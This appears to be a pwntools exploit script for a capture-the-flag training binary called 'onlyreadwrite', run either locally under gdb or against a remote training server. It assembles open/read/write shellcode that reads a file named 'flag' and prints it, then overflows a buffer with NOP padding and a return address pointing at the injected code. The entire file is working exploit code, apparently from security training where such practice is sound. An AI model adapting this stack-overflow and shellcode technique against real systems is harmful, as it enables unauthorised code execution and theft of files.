# coding=UTF-8
from pwn import *

CODE = '''
mov rbx, 0x67616c66
push rbx
mov rdi,rsp
mov rsi,0x0
mov rdx,0x0
mov rax,0x2
syscall
mov rdi, rax
mov rdx, 0x1000
mov rsi, 0x6020c0
mov rax, 0x0
syscall
mov rax, 0x1
mov rdi, 0x1
mov rsi, 0x6020c0
mov rdx, 0x1000
syscall
'''

ELF('./onlyreadwrite')
context.terminal = ['tmux', 'splitw', '-h']

if len(sys.argv) == 2 and sys.argv[1] == 'attack':
    r = remote('bin.training.jinblack.it', 2006)
else:
    r = process('./onlyreadwrite')
    gdb.attach(r, '''
    b *0x4009af
    c
    ''')

where_to_jump = p64(0x6020c0)
shellcode = asm(CODE,arch="amd64", bits='64')

expl = shellcode + b"\x90"*(1008-len(shellcode)) + b"\x90"*8 + where_to_jump

r.recvline()
input('press a key...')
r.sendline(expl)
responde = r.recv()
print(responde)
r.interactive()
r.interactive()

